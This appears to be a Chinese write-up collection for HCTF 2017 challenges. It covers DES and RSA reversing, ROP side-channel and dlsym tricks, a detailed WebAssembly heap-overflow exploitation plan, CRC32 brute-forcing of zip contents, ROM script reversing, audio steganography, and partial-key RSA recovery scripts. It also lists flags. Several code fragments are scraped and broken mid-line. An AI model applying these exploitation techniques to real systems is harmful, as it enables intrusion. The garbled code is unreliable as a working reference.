12, 13, 12, 13, 14, 15, 16, 17, 16, 17, 18, 19, 20, 21, 20, 21, 22, 23, 24, 25, 24, 25, 26, 27, 28, 29, 28, 29, 30, 31, 32, 1 }; // 每轮密钥的位移 char key_mov[16] = { 1, 1, 2, 2, 2, 2, 2, 2, 1, 2, 2, 2, 2, 2, 2, 1 }; // 压缩置换 char key_cmprs[48] = { 14, 17, 11, 24, 1, 5, 3, 28, 15, 6, 21, 10, 23, 19, 12, 4, 26, 8, 16, 7, 27, 20, 13, 2, 41, 52, 31, 37, 47, 55, 30, 40, 51, 45, 33, 48, 44, 49, 39, 56, 34, 53, 46, 42, 50, 36, 29, 32 }; // S 盒置换 char s_box[8][6][16] = { // S1 14, 4, 13, 1, 2, 15, 11, 8, 3, 10, 6, 12, 5, 9, 0, 7, 0, 15, 7, 4, 14, 2, 13, 1, 10, 6, 12, 11, 9, 5, 3, 8, 4, 1, 14, 8, 13, 6, 2, 11, 15, 12, 9, 7, 3, 10, 5, 0, 15, 12, 8, 2, 4, 9, 1, 7, 5, 11, 3, 14, 10, 0, 6, 13, // S2 15, 1, 8, 14, 6, 11, 3, 4, 9, 7, 2, 13, 12, 0, 5, 10, 3, 13, 4, 7, 15, 2, 8, 14, 12, 0, 1, 10, 6, 9, 11, 5, 0, 14, 7, 11, 10, 4, 13, 1, 5, 8, 12, 6, 9, 3, 2, 15, 13, 8, 10, 1, 3, 15, 4, 2, 11, 6, 7, 12, 0, 5, 14, 9, // S3 10, 0, 9, 14, 6, 3, 15, 5, 1, 13, 12, 7, 11, 4, 2, 8, 13, 7, 0, 9, 3, 4, 6, 10, 2, 8, 5, 14, 12, 11, 15, 1, 13, 6, 4, 9, 8, 15, 3, 0, 11, 1, 2, 12, 5, 10, 14, 7, 1, 10, 13, 0, 6, 9, 8, 7, 4, 15, 14, 3, 11, 5, 2, 12, // S4 7, 13, 14, 3, 0, 6, 9, 10, 1, 2, 8, 5, 11, 12, 4, 15, 13, 8, 11, 5, 6, 15, 0, 3, 4, 7, 2, 12, 1, 10, 14, 9, 10, 6, 9, 0, 12, 11, 7, 13, 15, 1, 3, 14, 5, 2, 8, 4, 3, 15, 0, 6, 10, 1, 13, 8, 9, 4, 5, 11, 12, 7, 2, 14, // S5 2, 12, 4, 1, 7, 10, 11, 6, 8, 5, 3, 15, 13, 0, 14, 9, 14, 11, 2, 12, 4, 7, 13, 1, 5, 0, 15, 10, 3, 9, 8, 6, 4, 2, 1, 11, 10, 13, 7, 8, 15, 9, 12, 5, 6, 3, 0, 14, 11, 8, 12, 7, 1, 14, 2, 13, 6, 15, 0, 9, 10, 4, 5, 3, // S6 12, 1, 10, 15, 9, 2, 6, 8, 0, 13, 3, 4, 14, 7, 5, 11, 10, 15, 4, 2, 7, 12, 9, 5, 6, 1, 13, 14, 0, 11, 3, 8, 9, 14, 15, 5, 2, 8, 12, 3, 7, 0, 4, 10, 1, 13, 11, 6, 4, 3, 2, 12, 9, 5, 15, 10, 11, 14, 1, 7, 6, 0, 8, 13, // S7 4, 11, 2, 14, 15, 0, 8, 13, 3, 12, 9, 7, 5, 10, 6, 1, 13, 0, 11, 7, 4, 9, 1, 10, 14, 3, 5, 12, 2, 15, 8, 6, 1, 4, 11, 13, 12, 3, 7, 14, 10, 15, 6, 8, 0, 5, 9, 2, 6, 11, 13, 8, 1, 4, 10, 7, 9, 5, 0, 15, 14, 2, 3, 12, // S8 13, 2, 8, 4, 6, 15, 11, 1, 10, 9, 3, 14, 5, 0, 12, 7, 1, 15, 13, 8, 10, 3, 7, 4, 12, 5, 6, 11, 0, 14, 9, 2, 7, 11, 4, 1, 9, 12, 14, 2, 0, 6, 10, 13, 15, 3, 5, 8, 2, 1, 14, 7, 4, 10, 8, 13, 15, 12, 9, 0, 3, 5, 6, 11 }; // P 盒置换 char p_box[32] = { 16, 7, 20, 21, 29, 12, 28, 17, 1, 15, 23, 26, 5, 18, 31, 10, 2, 8, 24, 14, 32, 27, 3, 9, 19, 13, 30, 6, 22, 11, 4, 25 }; // 末置换 char last_ch[64] = { 40, 8, 48, 16, 56, 24, 64, 32, 39, 7, 47, 15, 55, 23, 63, 31, 38, 6, 46, 14, 54, 22, 62, 30, 37, 5, 45, 13, 53, 21, 61, 29, 36, 4, 44, 12, 52, 20, 60, 28, 35, 3, 43, 11, 51, 19, 59, 27, 34, 2, 42, 10, 50, 18, 58, 26, 33, 1, 41, 9, 49, 17, 57, 25 }; // hash 置换，将加密后的密文置换为可读明文 char hs_ch[20] = \"0123456789abcdef\"; char sh_ch[128]; void init_trans() { char i; for (i = 0; i 0; j--) { dest[(i >= 1; } } } // 二进制转成字符 void BitToCh(char* dest, char* src, int length) { int i; for (i = 0; i > 3] > 3] |= src[i + 1]; // 添加到末位 } dest[length] = 0; } // 批置换，以offset为偏移，以count为长度 void BatchSet(char* dest, char* src, char* offset, int count) { int i; for (i = 0; i > 1] = (dest[i >> 1] 简单来说 只要把加密宏[0, 16 ,1]替换为[15, -1, -1]解密宏即可。 flag: hctf{Dr1v5r_M5ngM4n_2Oi7} ps: 附一张成功cm的截图 babystack 这题的名字叫babystack，程序中是一个直接的栈溢出。而且还自带一次任意地址读。当然这题的难点也很简单，只有read，write，open，exit系统调用。之所以搞出这个题目是受defcon的mute那题的启发。mute那题是用shellcode来实现的侧信道攻击。所以我就想能否用rop来实现侧信道的攻击。 下面是我在libc里找到的一个可以用来侧信道攻击的ROP .text:00000000000D72CE cmp cl, [rsi] .text:00000000000D72D0 jz short loc_D7266 .text:00000000000D72D2 pop rbx .text:00000000000D72D3 retn 在ret之后用一个read函数来block住代码。而比较成功之后则直接crash退出。使用这种方法来逐字节的比较flag。当然，解法不止这一种。libc里还有很多种的rop可以用来进行侧信道攻击。可以看看选手们的解法. poc见github babyre 这个题目的难度其实处在第三层和第四层之间。当初把它放第四层其实有点犹豫，因为感觉会有老司机秒杀他。 这个题目说起来其实很简答，我写了一个蒙哥马利乘算法和一个大整数加减的库。熟悉密码学的大佬应该知道蒙哥马利乘运算的作用就是进行快速模幂运算，即RSA的核心算法。有关蒙哥马利算法的文章网上其实有很多，我就不再赘述了。代码中只有e和n。将输入的flag转换成大数的形式，然后做en = pow(f,e,n)输出了大数en。这里用了一个非常大的e，使得可以用Wiener's attack来计算出d的值。然后用d即可解密出flag。 之所以认为他简单，是因为即使不知道蒙哥马利乘运算也能够猜出是RSA。首先是因为大整数加减以及乘运算，这些大整数运算还是很容易就可以分辨的。一旦分辨出这些运算，应该就能联想到RSA。第二个就是模幂运算化简式子。对于一个D=C**E%N的大数运算，可以采用下面的化简式子。 D=1 FOR i=n TO 0 D=D*D % N IF E[i]=1 D=D*C % N RETURN D 能看出这个式子是模幂运算的化简式子，即使看不懂乘法函数是个什么鬼。应该也能猜到什么了。 rroopp 之所以写这个题目，只有一次在写实际栈溢出利用的时候碰到了这个情况。栈溢出是在链接库中，没有打开的可以leak用的文件描述符。而主程序就只有这么一点点代码。当时自己写rop的时候感觉挺有意思的，就拿出来写了这样一个题目(主程序是我直接patch当初那个程序来的，没有源码。可以猜猜是什么程序：) 当然launch.so就是我自己写的程序了。里面大致模拟了ipv4包解析的过程。当然也是一个直接的栈溢出。在最后合并包的时候并没有检查长度而是使用了一个固定长度的栈缓冲区。 当然虽然binary比较小，其实还是有挺多可以用的gadget的。这里还有一个很好玩的技巧，就是dlsym的handle可以指定为RTLD_DEFAULT和RTLD_NEXT来从已经加载的动态链接库中查找函数。所以无需指定handle的值可以可以调用libc中的函数的。 old driver 这个逆向题目其实也是一个算法题，很可惜没有人能做出来。写这个题目的初衷是我上学期上的数据压缩实验。这个算法期末占15分huaji.jpg 好吧，这个压缩算法其实就是jpeg压缩算法拉。当然和现在通用的jpg图片的压缩算法还是有点差别的，是最初最简单的那个版本。有关jpeg压缩算法的介绍其实挺多的。如果不是像我一样不习惯用MATLAB的话。其实用MATLAB解这东西其实是最快的。 当然jpeg压缩其实也有很多的特征可以查找的。包括DFT算法实现，包括量化用的标准量化表，包括最后做哈弗曼编码所用的哈弗曼表。其实都是非常明显的特征。最明显的就是jpeg压缩所使用的量化表了。抠出来一查就能发现。 decode.py就是我自己写的重建jpeg用的函数。当然如果发现重建的图像非常魔性也不要惊讶。是我压缩比率调整的太高的原因。反正能看到flag就可以了2333 online encryptor 背景 这题由于放题的时候失误没把题开始就放上去，所以剩下的时间可能不够去做了。而且好像有被题目名误导到的人（ 。回到题目，这题是一个披着web和crypt皮的pwn题。事实上，在之前刚看到wasm的时候我就有想能不能搞个pwn出来。然后这次也算是实现了自己的一些想法。 webassembly (以下简称wasm) 技术目前可以说并不完善，而且我也并不算是了解了整个系统的全貌，因此如果有理解不到位的地方请见谅，欢迎一起讨论。 事实上，在wasm技术提出之前就已经有类似技术出现了（asm.js），wasm和asm.js不同的是wasm创建了二进制文件格式（.wasm）和新的汇编语言。比如helloword的汇编看上去就是这样的（会lisp的同学看起来大概没啥鸭梨） (module (type $FUNCSIG$ii (func (param i32) (result i32))) (type $FUNCSIG$iii (func (param i32 i32) (result i32))) (import \"env\" \"iprintf\" (func $iprintf (param i32 i32) (result i32))) (table 0 anyfunc) (memory $0 1) (data (i32.const 16) \"hello world!\\00\") (export \"memory\" (memory $0)) (export \"hello\" (func $hello)) (export \"test\" (func $test)) (func $hello (drop (call $iprintf (i32.const 16) (i32.const 0) ) ) ) (func $test (result i32) (i32.const 16) ) ) 关于这些指令的具体意义可以去官方文档上看。这里就不多展开了。两者的目标相接近，都是为了能用c/c++语言写web（可以想象一下js那效率。。。），所以这题的wasm当然也是c写的。 然后怎么出成一个pwn呢，wasm存在函数栈，但这部分是有严格check的（可以类比下python的，其实js引擎负责解析wasm的部分也是个解释器），而且这个栈是对用户隐藏的，也就是搞栈这条路断了（至少我没想出来怎么搞这个栈），于是打算出一个关于堆的pwn。 这题本来想用emcc编译，但emcc编译出来的wasm和js复杂难懂。。。至少我觉得如果我用emcc编译出来那是99%没人做出来的。所以用了clang+binaryen+wabt 来生成wasm。接下来介绍几个必要的姿势： 1. memory layout wasm的memory默认是从0开始向下拓展，以10k为一个基本单位，当内存不够的时候可以通过grow指令增长，当然js层也有相应的接口可以调用。memory里面会有全局变量，当然你想放啥都可以，自己实现一个堆管理或者直接用glibc的那个堆管理都是可以的。同样，js层和c层都可以对其中的内存进行读写操作。 2. js层和c层的互相调用 js调用c层可以通过在c层定义好相应的函数，然后export，直接就能在js层调用，这里说一个参数问题。 wasm用的是32位，也就是参数和返回值都可以当作uint32_t，对于js来说这就是单纯的一个数字，但对于c来说如果你是char* ，那么它就是指向memory地址的一个char指针。如果是int，就是整形，这点就会有一个问题，就是你如果想在js传字符串到c那边，得对memory做操作，而不能直接把js的字符串当做参数传。 c层调用js也是类似的，在js那边预先定义好一系列函数然后放在同一个object里传进wasm的环境。再说一遍，这儿的参数和返回值也都得是uint32_t。 3. c层的限制 由于是用js做为环境而不是linux的环境，所以很大一部分的c库函数都无法使用，当然要用也可以，可以用js模拟出一个linux的环境（把syscall都自己用js实现一遍），可能有现成的，但为了保持题目简洁，我并没有引用glibc的函数。期待以后wasm能有自己的底层环境而不用去依赖js。 回到题目 这题是一个nodejs作为后端的在线加密器，在js层调用了wasm进行加解密操作。可以输入一个8字节的password和任意字节的data做加解密 加密为流加密，逻辑大概是这样的： key = hash(hash(flag)^pass)^random; 其中hash函数是我自己实现的（乱写的），接受任意字节，返回16字节；flag为32字节，pass为8字节，random为16字节，通过js层的random获取。 output = random | enc(data, key); enc函数内部会把key拆成4字节的4部分，利用 mt_rand 作为PRNG把data加密4次。 解密流程相同 但看这个加解密是拿不到flag的，因为flag在最开始就被hash了。所以这题就是pwn啦。 然后堆是自己实现的，其中 struct chunk { unsigned int size; unsigned int pre_size; struct chunk* fd; }; 题外话，自己写过堆之后才发现这种结构是不可取的啊，具体的就是这个pre_size的field没法重利用了。反正不管，这里的pre_size和fd都不会重利用（偷懒）; 不同size的堆块放在不同size区间（间隔0x10）的单链表里，但不会做align, `#define find_index(size) ((size/0x10) > 0x20 ? 0x1f : (size/0x10)) ;` 用单链表实现了类似unlink一样的效果： void unlink(struct chunk* current) { int index = find_index(current->size); struct chunk* ite = bins[index]; if(ite != 0) { while(ite->fd != 0) { if(ite->fd == current) { ite->fd = current->fd; break; } ite = ite -> fd; } } } 也可以做merge，具体源码在github上，可以看到，基本全程没啥check，一些glibc用不到的技巧都可以用了！ 说了这么多，洞在哪呢？？以下为wasm2wast 跑出来wast的一部分 (export \"memory\" (memory 0)) (import \"env\" \"grow\" (func (;0;) (type 1))) (import \"env\" \"read_data\" (func (;1;) (type 1))) (import \"env\" \"read_file\" (func (;2;) (type 2))) (import \"env\" \"read_pass\" (func (;3;) (type 1))) (import \"env\" \"read_random\" (func (;4;) (type 1))) 这些是内部函数同import 函数名之间的关系 (export \"malloc\" (func 5)) (export \"unlink\" (func 6)) (export \"free\" (func 7)) (export \"Initialize\" (func 8)) (export \"ExtractU32\" (func 9)) (export \"hash\" (func 10)) (export \"mycrypt\" (func 11)) (export \"encrypt\" (func 12)) (export \"decrypt\" (func 13)) (export \"out_size\" (func 14)) 这些是内部函数与export 函数名之间的关系 来看看decrypt函数 (func (;13;) (type 0) (result i32) (local i32 i32 i32 i32 i32 i32 i32) i32.const 32 call 5 set_local 5 i32.const 1024 call 5 set_local 0 i32.const 8 call 5 set_local 1 i32.const 16 call 5 set_local 2 i32.const 2672 get_local 5 i32.const 32 call 2 drop get_local 0 call 1 set_local 3 get_local 1 call 3 drop i32.const 0 set_local 6 block ;; label = @1 loop ;; label = @2 get_local 6 i32.const 16 i32.eq br_if 1 (;@1;) get_local 2 get_local 6 i32.add get_local 0 get_local 6 i32.add i32.load8_u i32.store8 get_local 6 i32.const 1 i32.add set_local 6 br 0 (;@2;) end end get_local 5 i32.const 32 call 10 set_local 4 i32.const 0 set_local 6 block ;; label = @1 loop ;; label = @2 get_local 6 i32.const 8 i32.eq br_if 1 (;@1;) get_local 4 get_local 6 i32.add tee_local 5 get_local 5 i32.load8_u get_local 1 get_local 6 i32.add i32.load8_u i32.xor i32.store8 get_local 6 i32.add i32.load8_u i32.xor i32.store8 get_local 6 i32.const 1 i32.add set_local 6 br 0 (;@2;) end end get_local 1 call 7 get_local 4 i32.const 16 call 10 set_local 1 get_local 4 call 7 i32.const 0 set_local 6 block ;; label = @1 loop ;; label = @2 get_local 6 i32.const 16 i32.eq br_if 1 (;@1;) get_local 1 get_local 6 i32.add tee_local 5 get_local 5 i32.load8_u get_local 2 get_local 6 i32.add i32.load8_u i32.xor i32.store8 get_local 6 i32.const 1 i32.add set_local 6 br 0 (;@2;) end end get_local 2 call 7 get_local 1 get_local 0 i32.const 16 i32.add get_local 3 call 5 tee_local 6 get_local 3 i32.const -16 i32.add tee_local 2 call 11 i32.const 0 get_local 2 i32.store offset=2680 get_local 0 call 7 get_local 6) 看上去很长，把这个decrypt函数稍微翻译下： 看上去很长，把这个decrypt函数稍微翻译下： (func (;decrypt;) (type 0) (result i32) (local i32 i32 i32 i32 i32 i32 i32) i32.const 32 call malloc set_local 5 // var_5 = malloc(32); i32.const 1024 call malloc set_local 0 // var_0 = malloc(1024); i32.const 8 call malloc set_local 1 // var_1 = malloc(8); i32.const 16 call malloc set_local 2 // var_2 = malloc(16); i32.const 2672 get_local 5 i32.const 32 call read_file // readfile(21, var_5, 2672); drop get_local 0 call read_data set_local 3 // var_3 = read_data(var_0); get_local 1 call read_pass // read_pass(var_1); drop i32.const 0 set_local 6 // var_6 = 0; block ;; label = @1 loop ;; label = @2 // while; get_local 6 i32.const 16 i32.eq br_if 1 (;@1;) // if(var_6 == 16) break; get_local 2 get_local 6 i32.add // var_2 + var_6; get_local 0 get_local 6 i32.add // var_0 + var_6; i32.load8_u i32.store8 // *(var_2 + var_6) = *(var_0+var_6); get_local 6 i32.const 1 i32.add set_local 6 br 0 (;@2;) // var_6 += 1; end end get_local 5 i32.const 32 call hash set_local 4 // var_4 = hash(var_5, 32); i32.const 0 set_local 6 // var_6 = 0; block ;; label = @1 loop ;; label = @2 get_local 6 i32.const 8 i32.eq br_if 1 (;@1;) // if(var_6 == 8) break; get_local 4 get_local 6 i32.add // var_4 + var_6; tee_local 5 // var_5 = var_4 + var_6 get_local 5 i32.load8_u // *var_5; get_local 1 get_local 6 i32.add // var_1 + var_6; i32.load8_u // *(var_1 + var_6); i32.xor i32.store8 // *(var_4 + var_6) ^= *var_5; get_local 6 i32.const 1 i32.add set_local 6 // var_6 += 1; br 0 (;@2;) end end get_local 1 call free // free(var_!); get_local 4 i32.const 16 call hash set_local 1 // var_1 = hash(var_4, 16) get_local 4 call free // free(var_4); i32.const 0 set_local 6 // var_6 = 0; block ;; label = @1 loop ;; label = @2 get_local 6 i32.const 16 i32.eq br_if 1 (;@1;) // if(var_6 == 16) break; get_local 1 get_local 6 i32.add tee_local 5 get_local 5 i32.load8_u get_local 2 get_local 6 i32.add i32.load8_u i32.xor i32.store8 // 和之前一样(var_1 + var_6) ^= (var_2 + var_6); get_local 6 i32.const 1 i32.add set_local 6 // var_6 += 1; br 0 (;@2;) end end get_local 2 call free // free(var_2); get_local 1 // var_1 get_local 0 i32.const 16 i32.add // var_0 + 16 get_local 3 call malloc // out = malloc(var_3); tee_local 6 get_local 3 i32.const -16 i32.add // var_3 - 16 tee_local 2 // var2 = var_3 - 16 call mycrypt // mycrypt(var_1 ,var_0 + 16, out, var_3 - 16) i32.const 0 get_local 2 i32.store offset=2680 // *(2680) = var_2; get_local 0 call free // free(var_0); get_local 6) 这样就翻译的差不多了，应该和我开始对加解密的描述差不多，可以发现，js层传入的data长度最长可以有0x1000个字节，但从decrypt函数可以看出data这只malloc了1024个字节，于是多出来的就造成了一个堆溢出，可以利用类似方式（手工）对其他函数包括malloc和free函数进行逆向，虽然工作会艰辛很多233。 接下来我们来看看如何利用，来看看开始的那几个malloc之后的layout heapbase: flag key+32+12: data data+1024+12: pass pass+8+12: random 可以看到data下面就是pass和random，除了flag没有被free（这是我觉得强行出题的一点。。。），下面的pass和random都会在用完之后被free，那么就想想怎么把flag leak出来吧！ 接下来的部分可能对不了解堆内部的人很模糊，如果没看过源码或者自己逆过就别看了==== 默认你已经知道这个堆和加解密部分的实现了。 可以想到的一个最简单的方式是让最后output指针malloc到flag前面，然后修改2680那个outsize到合适大小（如果大小超过了memory长度，不会反回结果）。问题是在于怎么实现，我们能做的： 在程序开始的时候溢出data块，能拿到两个可控的即将被free的堆块 最后修改outsize的时候只有一个操作就是free(data); 也就是得在free之后改掉2680那个size 做到这两点在glibc里应该是不可能的，但这个堆没有任何check。 做到这个的最关键的一点在merge的时候 void free(unsigned char* ptr) { struct chunk* current = to_chunk(ptr); struct chunk* next = next_chunk(current); if(!(current->size & 1)) { struct chunk* pre = to_mem(current) - current->pre_size - 12; pre->size += ((current->size&0xfffffffe) + 12); // unlink pre unlink(pre); current = pre; } ... } 不会有任何的check，也就是我们能把当前的size加到prev块的size位上，但prev块的size位的位置是由当前堆块的pre_size位决定的，于是就能在前面任意位置加上当前size，只是这个size不能太大，不然在找当前块的下一块的时候会超出memory长度。 现在有任意写了，但有一个问题，要做到这点得把当前块的inuse位清0，而data块要改inuse位不容易。因为上面没有任何堆块，而且也不能拿两个能溢出的堆块中一个堆块改size，因为只能加上偶数的size，并不能改变size的inuse位。 没有堆块就自己创建堆块！free的时候会merge上面的堆块，然后merge之后的那个size我们是可控的，在free的最后，会清空下一块的inuse位然后设置pre_size // link current to bins int index = find_index(current->size); current->fd = bins[index]; bins[index] = current; // clear next chunk's inuse bit and set the pre_size next = next_chunk(current); next->size &= 0xfffffffe; next->pre_size = current->size&0xfffffffe; 那么思路就出来了： 覆盖pass堆块，使其merge完的结果在data上面，同时设置data块的size字段 覆盖random堆块，设置data块的pre_size malloc output的结果会到key上面那段 free data块的时候就能把size加到outsize，达到leak 然而实际操作中两个free的堆块在bins中的长度都会超过0x200然后分到最后一个链表，output会优先取random堆块free的那块。所以得把1，2的操作反一下。然后这题就解决了，可喜可贺（ ps：出题人没有源码大概也没法做出来 pps：写堆管理很有意思，出完题看着源码自己日自己写的题还日了一整天也很有意思 ppps：比赛完再逆一遍自己的题不容易，各位要打出题人的请手下留情orz poc： ``` 结果： ��n�&��A�t���oe��.^�����S�;c�d3�### big_zip 由于github上有对6位的crc32的快速爆破脚本，故将文本分为5字节。其实只要将github上的代码稍稍改动就能快速破解5位的crc32了。 # -- coding: utf-8 -- import itertools import binascii import string class crc32_reverse_class(object): # the code is modified from https://github.com/theonlypwner/crc32/blob/master/crc32.py def __init__(self, crc32, length, tbl=string.printable, poly=0xEDB88320, accum=0): self.char_set = set(map(ord, tbl)) self.crc32 = crc32 self.length = length self.poly = poly self.accum = accum self.table = [] self.table_reverse = [] def init_tables(self, poly, reverse=True): \\# build CRC32 table for i in range(256): for j in range(8): if i & 1: i >>= 1 i ^= poly else: i >>= 1 self.table.append(i) assert len(self.table) == 256, \"table is wrong size\" \\# build reverse table if reverse: found_none = set() found_multiple = set() for i in range(256): found = \\[\\] for j in range(256): if self.table\\[j\\] >> 24 == i: found.append(j) self.table_reverse.append(tuple(found)) if not found: found_none.add(i) elif len(found) > 1: found_multiple.add(i) assert len(self.table_reverse) == 256, \"reverse table is wrong size\" def rangess(self, i): return ', '.join(map(lambda x: '\\[{0},{1}\\]'.format(*x), self.ranges(i))) def ranges(self, i): for kg in itertools.groupby(enumerate(i), lambda x: x\\[1\\] - x\\[0\\]): g = list(kg\\[1\\]) yield g\\[0\\]\\[7\\], g\\[-1\\]\\[8\\] def calc(self, data, accum=0): accum = ~accum for b in data: accum = self.table\\[(accum ^ b) & 0xFF\\] ^ ((accum >> 8) & 0x00FFFFFF) accum = ~accum return accum & 0xFFFFFFFF def findReverse(self, desired, accum): solutions = set() accum = ~accum stack = \\[(~desired,)\\] while stack: node = stack.pop() for j in self.table_reverse\\[(node\\[0\\] >> 24) & 0xFF\\]: if len(node) == 4: a = accum data = \\[\\] node = node\\[1:\\] + (j,) for i in range(3, -1, -1): data.append((a ^ node\\[i\\]) & 0xFF) a >>= 8 a ^= self.table\\[node\\[i\\]\\] solutions.add(tuple(data)) else: stack.append(((node\\[0\\] ^ self.table\\[j\\]) = 4: patches = self.findReverse(desired, accum) for patch in patches: checksum = self.calc(patch, accum) print 'verification checksum: 0x{0:08x} ({1})'.format( checksum, 'OK' if checksum == desired else 'ERROR') for item in self.dfs(self.length - 4): patch = map(ord, item) patches = self.findReverse(desired, self.calc(patch, accum)) for last\\_4\\_bytes in patches: if all(p in self.char_set for p in last\\_4\\_bytes): patch.extend(last\\_4\\_bytes) print '\\[find\\]: {1} ({0})'.format( 'OK' if self.calc(patch, accum) == desired else 'ERROR', ''.join(map(chr, patch))) else: for item in self.dfs(self.length): if crc32(item) == desired: print '\\[find\\]: {0} (OK)'.format(item) def crc32_reverse(crc32, length, char_set=string.printable, poly=0xEDB88320, accum=0): ''' :param crc32: the crc32 you wnat to reverse :param length: the plaintext length :param char_set: char_set :param poly: poly , default 0xEDB88320 :param accum: accum , default 0 :return: none ''' obj = crc32_reverse_class(crc32, length, char_set, poly, accum) obj.run_reverse() def crc32(s): ''' :param s: the string to calculate the crc32 :return: the crc32 ''' return binascii.crc32(s) & 0xffffffff from my_crc32 import * l=[0x251dee02, 0xb890530f, 0x6e6b39df, 0x50f684c3, 0xde41b551, 0x24bd35b6, 0xcef2eda8, 0xba2b1745, 0x1f4c7ea9, 0x58b2bfa9, 0x251dee02, 0xe0f81f1e, 0xbd6fbd41, 0x7342a1f6, 0x665648e9, 0xe7c594b3, 0xa60ffdd0, 0xce2ce80b, 0x22459f2d, 0x6f8a6539, 0x2073a2e4, 0x52fa60a8, 0x80410dda, 0xb7c68f27, 0x6e6b39df, 0xbd598041, 0xaa145d64, 0x16da6b3b, 0x7dd590bc, 0xb9eef5a1, 0xf0b958f0, 0x445a43f7, 0x8bd55271, 0xc0340fe2, 0xc0cd9ee5, 0x7fc7de58, 0x53bfec8a, 0x99b5537b, 0xd68019af, 0x73d7ee30, 0x5fbd3f5e] for k in l: crc32_reverse(k,5) print '=======' ``` #You\\_know\\_the\\_bed\\_feels\\_warmer\\_Sleeping\\_here\\_alone\\_You\\_know\\_I\\_dream\\_in\\_color\\_And\\_do\\_the\\_things\\_I\\_want\\_You\\_think\\_you\\_got\\_the\\_best\\_of\\_me\\_Think\\_you\\_had\\_the\\_last\\_laugh\\_Bet\\_you\\_think\\_that\\_everything\\_good\\_is\\_gone crc32爆破完连接成文，很容易发现是最后一个文本。然后使用已知明文攻击即可。（有些人说因为我用7z压缩的zip所以他已知明文一直攻击不成功，我表示是我没有考虑到 pokemon 打开游戏，大木会直接和你疯狂暗示 大木告诉你，FLAG在第一个道馆，去打败馆主。到研究室领精灵，助手给你20个奇异糖果，让你快速升级。再次提醒打败第一个馆主。 一路打怪升级到第一个道馆 打败后 馆主说我不会告诉你的，想知道的话自己去逆向这个rom。正文开始。用PPRE工具。 text_11=\"HIIIIIINT(You-really-want-to-get-the-flag-by-submi ting-it-one-by-one?)\" text_12=\"HIIIIIINT(Try-to-read-the-scrpit-XP)\" text_13=\"HIIIIIINT(Don’t forget to change Brackets to Curly Brackets !!!!)\" 下面是一堆flag，但只有一个是正确的。提示你去看脚本。锁定脚本 Fanfare 1500 Lockall Faceplayer Checkbadge 0 0x800c If 0x800c 1 CheckLR 1 func_5 Message 0 CloseMsgOnKeyPress TrainerBattle 20 0 0 CheckTrainerLost 0x800c If 0x800c 0 CheckLR 1 func_6 Setbdgtrue 0 ActMainEvent 22 SetTrainerId 29 SetTrainerId 50 Setvar 0x4074 1 Setflag 402 Setvar 16648 6 Setflag 244 Setflag 403 Message 1 SetvarHero 0 Message 2 Soundfr 1189 Fadedef Message 3 Jump func_7 到func_7 Setvar 0x8004 378 Setvar 0x8005 1 CheckItem3 0x8004 0x8005 0x800c If 0x800c 0 CheckLR 1 func_15 Callstd 241 7 Setflag 115 Clearflag 741 Setvar 0x8004 378 Setvar 0x8005 1 CheckItem3 0x8004 0x8005 0x800c If 0x800c 0 CheckLR 1 func_16 Message 4 WaitButton CloseMsgOnKeyPress Releaseall End 分析逻辑可知，func_16永远不会被执行到func_16 Message 64 WaitButton CloseMsgOnKeyPress Releaseall End 发现是使用64号text弹出对话框 text_64=\"HCTF(6A0A81AB5F9917B1EEC3A6183C614380)\" get flag `HCTF{6A0A81AB5F9917B1EEC3A6183C614380}` New_Love_Song 不知道各位还记不记得去年HCTF的图片隐写题，去年的大一通信小学弟今年已经大二了。他从课堂上学会了音频隐写，并选了大家（wo）LP的一首歌准备在双11送给大家（虽然没几个人开到） 解题分析： 题目后来也放过hint: concentrate on the waveform 注意波形图用Audacity打开new_love_song.wav,基本近似于一种矩形:而正常的音频波形往往都是高低起伏的:所以我们就把波放大，能够发现：相隔特定的距离 就会出现一段直线。接触过的人肯定知道，直线波就是某一特定的值能够猜测 肯定有东西藏在其中，尝试提取出来，发现是一串01串 长度可开方 ，又是熟悉的转换二维码，扫描get flag 解题脚本： clc clear close all %% load data wm_sz = 20000; % watermark size px_sz = wm_sz/8; % number of pixels im_sz = sqrt(px_sz); % image size host_new = audioread ('new\\_love\\_song.wav'); % new (watermarked) host signal host_new = uint8(255*(host_new + 0.5)); % double \\[-0.5 +0.5\\] to 'uint8' \\[0 255\\] %% prepare host host_bin = dec2bin(host_new, 8); % binary host \\[n 8\\] %% extract watermark wm\\_bin\\_str = host_bin(1:wm_sz, 8); wm_bin = reshape(wm\\_bin\\_str, px_sz , 8); wm_str = zeros(px_sz, 1, 'uint8'); for i = 1:px_sz % extract water mark from the first plane of host wm_str(i, :) = bin2dec(wm_bin(i, :)); end wm = reshape(wm_str, im_sz , im_sz); %% show image imshow(wm) BabyRSA 先看下题目的逻辑 M = r * bytes\\_to\\_long('hctf{' + sha256(open('./flag').read()).hexdigest() + '}') S = pow(M, d, n) 程序接收 r，然后同 flag 相乘后计算出它的数字签名先说下本来的思路，flag 为 m，单纯 flag 的签名为 S，返回的签名为 S',如果我们构造 r=R^e因为所以 e 的值未知，通过爆破 e 的值遍历提交 R^e，再根据上式得出 flag 但是题目忘记对 r 进行限制，导致也可以通过传入 r=2 来做出因为 2m ，所以直接对 S'^e 除以 2 就是 m ps: Blue-Whale 队师傅的解法然后对 m^2 开方就是 flag 了 WeakRSA 已知部分 d 的最低有效位，是可以还原出 d 的，原理部分。但对于已知的位数是有要求的其中 M=2^k，k 是 d 的最低有效位的位数出题时没测试好，本来是要给的位数不够还原，需要爆破的，给下脚本 #!/usr/bin/python #\\-\\*\\- coding:utf-8 -*- import sys, re from libnum import nroot from Crypto.Util.number import size n = 24129492308224479830531863430667763206113500947912894148049103046436751018902380216549212087945014575866175372699327952352562583984599024982322742653474650254469019243745562427155195911292231061633627557914070970650388286259815766552728485153840458510677169495483383264554397982155108666923510839292748291941615629484247125025729363254239159271724680451974211566266307311323012908187153011368890695841034381925365547836453167672856111790684457634738536647974450864723943635507973978195453912898978987904396630176208142995219377309529324099766495068346782530074954504554550936100220114319876296005855618193837568032249 e = 65537 low_d2 = 585021050422437790400309277934736421671174903453118287773262727237276990096608684311252820485289582300237832073420122197911787329400438609843024619449229662477502424617432168933632994437196549098808097025413678738558952555239079729908003264517051128647960060385270607296895534639200191803399174999679917012421 low_bits = 1028 test = pow(3, e, n) i = 0 prefix = \\[\\] for a in range(2): for b in range(2): prefix.append(str(a) + str(b)) for bf in prefix: low_d = int(bin(low_d2)\\[2:\\], 2) for k in xrange(1, e): d = (k * n + 1) / e d >>= low_bits d 评论区 请文明评论，禁止广告 CTF Writeup®未经许可，禁止转载。Copyright © CTF Writeup all right reserved, powered by CTF WriteupModified at 2019-05-02 00:28:01 0 issues 